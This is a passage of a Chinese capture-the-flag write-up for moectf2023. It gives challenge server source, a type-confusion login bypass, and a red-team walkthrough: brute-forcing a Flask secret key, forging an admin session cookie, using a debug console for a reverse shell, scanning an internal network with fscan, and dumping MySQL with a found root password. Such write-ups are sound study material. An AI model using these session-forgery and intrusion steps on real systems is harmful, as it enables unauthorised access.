class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())    <span class="hljs-comment">#生成字典</span><br><br><span class="hljs-built_in">eval</span>([[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> base64.b64encode <span class="hljs-keyword">in</span> [base64.b64decode]]) <span class="hljs-comment"># what is it?</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data:<span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            data = base64.b64encode(data).decode() <span class="hljs-comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br>        <span class="hljs-keyword">return</span> data<br><br>__page__ = base64.b64encode(<span class="hljs-string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/&quot;</span>:<br>                self.send_response(<span class="hljs-number">200</span>)<br>                self.end_headers()<br>                self.wfile.write(__page__)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/login&quot;</span>:<br>                body = self.rfile.read(<span class="hljs-built_in">int</span>(self.headers.get(<span class="hljs-string">&quot;Content-Length&quot;</span>)))<br>                payload = json.loads(body)<br>                params = json.loads(decrypt(payload[<span class="hljs-string">&quot;params&quot;</span>]))<br>                <span class="hljs-built_in">print</span>(params)<br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == <span class="hljs-string">&quot;admin&quot;</span>:<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == params.get(<span class="hljs-string">&quot;password&quot;</span>):<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;same&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))        <span class="hljs-comment"># md5(username)^md5(password)</span><br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self.send_response(<span class="hljs-number">200</span>)<br>                        self.end_headers()<br>                        self.wfile.write(json.dumps(data).encode())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        <span class="hljs-keyword">return</span><br>                self.send_response(<span class="hljs-number">403</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;Invalid username or password&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    server = http.server.HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">9999</span>), MyHandler)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure>
<p><code>def do_POST(self)</code>方法做了几个限制<br><code>username 不能等于 admin</code><br><code>username 不能等于 password</code><br>可以利用字符和数字进行绕过，例如<code>username=&quot;1&quot;  password=1</code><br><img src="/mdimg/moectf2023/35.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h3><p><code>moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;</code>解压密码</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">本题你将扮演<span class="hljs-strong">**红队**</span>的身份，以该外网ip入手，并进行内网渗透，最终获取到完整的flag<br><br>题目环境：http://47.115.201.35:8000/<br><br>在本次公共环境中渗透测试中，希望你<span class="hljs-strong">**不要做与获取flag无关的行为，不要删除或篡改flag，不要破坏题目环境，不要泄露题目环境！**</span><br><br><span class="hljs-strong">**注册时请不要使用你常用的密码，本环境密码在后台以明文形式存储**</span><br><br>hint.zip 密码请在拿到外网靶机后访问根目录下的<span class="hljs-strong">**readme**</span>，完成条件后获取<br><br>环境出现问题，请第一时间联系出题人<span class="hljs-strong">**xlccccc**</span><br><br>对题目有疑问，也可随时询问出题人<br></code></pre></td></tr></table></figure>
<p>进入靶机注册登录之后<br><img src="/mdimg/moectf2023/36.png" srcset="/img/loading.gif" lazyload><br>给了session 的key的前面的字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, secret_key</span>):<br>        self.secret_key = secret_key<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>        <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            app = MockApp(secret_key)<br><br>            session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>            si = SecureCookieSessionInterface()<br>            s = si.get_signing_serializer(app)<br><br>            <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> secret_key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                compressed = <span class="hljs-literal">False</span><br>                payload = session_cookie_value<br>                <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                    compressed = <span class="hljs-literal">True</span><br>                    payload = payload[<span class="hljs-number">1</span>:]<br>                data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br>                data = base64_decode(data)<br>                <span class="hljs-keyword">if</span> compressed:<br>                    data = zlib.decompress(data)<br>                <span class="hljs-keyword">return</span> data<br>            <span class="hljs-keyword">else</span>:<br>                app = MockApp(secret_key)<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cnt = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        cookie_value = <span class="hljs-string">&#x27;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6InpoYW55aSJ9.ZRU6Zg.c4JlmybB6IBoCVt7x1gJfKoRha4&#x27;</span><br>        secret_key = <span class="hljs-string">&quot;This-random-secretKey-you-can&#x27;t-get&quot;</span> + os.urandom(<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>()<br>        <span class="hljs-keyword">if</span> secret_key:<br>            result = FSCM.decode(cookie_value, secret_key)<br>        <span class="hljs-keyword">else</span>:<br>            result = FSCM.decode(cookie_value)<br>        cnt += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(result, cnt)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;power&#x27;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(result, secret_key, <span class="hljs-string">&#x27;YES&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>用脚本爆破得到key：<code>This-random-secretKey-you-can&#39;t-get002c</code><br>尝试session伪造</p>
<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key=<span class="hljs-string">&quot;This-random-secretKey-you-can&#x27;</span>t-get002c<span class="hljs-string">&quot;</span><br><span class="hljs-string">    print(FSCM.encode(key,&quot;</span>&#123;<span class="hljs-string">&#x27;power&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;<span class="hljs-string">&quot;))</span><br></code></pre></td></tr></table></figure>
<p><img src="/mdimg/moectf2023/37.png" srcset="/img/loading.gif" lazyload><br><code>[http://47.115.201.35:8000/console](http://47.115.201.35:8000/console)</code>  <code>138-429-604</code><br>反弹shell<br><img src="/mdimg/moectf2023/38.png" srcset="/img/loading.gif" lazyload><br><code>moectf&#123;Information-leakage-Is-dangerous!</code><br>另外根目录下也有readme文件<br><img src="/mdimg/moectf2023/39.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/40.png" srcset="/img/loading.gif" lazyload><br>python获取本机内网ip<br><img src="/mdimg/moectf2023/41.png" srcset="/img/loading.gif" lazyload><br>使用fscan扫描：<code>./fscan -h 172.21.0.3/24 -np -no -nopoc</code><br>解压密码：<code>22-3306-6379-8080</code></p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果<br>可以看到，在本内网下还有另外两台服务器<br>其中一台开启了<span class="hljs-number">22</span>(ssh)和<span class="hljs-number">6379</span>(redis)端口<br>另一台开启了<span class="hljs-number">3306</span>(mysql)端口<br>还有一台正是你访问到的留言板服务<br>接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器<br>此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件<br>连接代理，推荐`proxychains`<br>对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2<br>对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3<br></code></pre></td></tr></table></figure>
<p><img src="/mdimg/moectf2023/42.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/43.png" srcset="/img/loading.gif" lazyload><br>在shell里装一个pymysql <code>pip install pymysql</code><br><img src="/mdimg/moectf2023/44.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">import pymysql<br>&gt;&gt;&gt; db = pymysql.<span class="hljs-title function_ invoke__">connect</span>(host=<span class="hljs-string">&quot;mysql&quot;</span>,port=<span class="hljs-number">3306</span>,user=<span class="hljs-string">&quot;root&quot;</span>,passwd=<span class="hljs-string">&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;</span>,database=<span class="hljs-string">&quot;messageboard&quot;</span>,charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>&lt;Nev3r_Kn0w<span class="hljs-string">&quot;,database=&quot;</span>messageboard<span class="hljs-string">&quot;,charset=&#x27;utf8&#x27;)</span><br><span class="hljs-string">&gt;&gt;&gt; cursor=db.cursor()</span><br><span class="hljs-string">cursor=db.cursor()</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>show databases<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>show databases<span class="hljs-string">&quot;)</span><br><span class="hljs-string">5</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>show tables<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>show tables<span class="hljs-string">&quot;)</span><br><span class="hljs-string">3</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.fetchall()</span><br><span class="hljs-string">cursor.fetchall()</span><br><span class="hljs-string">((&#x27;flag&#x27;,), (&#x27;message&#x27;,), (&#x27;users&#x27;,))</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>select *<span class="hljs-keyword">from</span> flag<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>select *<span class="hljs-keyword">from</span> flag<span class="hljs-string">&quot;)</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.fetchall()</span><br><span class="hljs-string">cursor.fetchall()</span><br><span class="hljs-string">((&#x27;-Are-YOu-myS0L-MasT3r?-&#x27;,),)</span><br><span class="hljs-string">&gt;&gt;&gt; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<p>得到<code>-Are-YOu-myS0L-MasT3r?-</code><br><code>pip install redis</code></p>
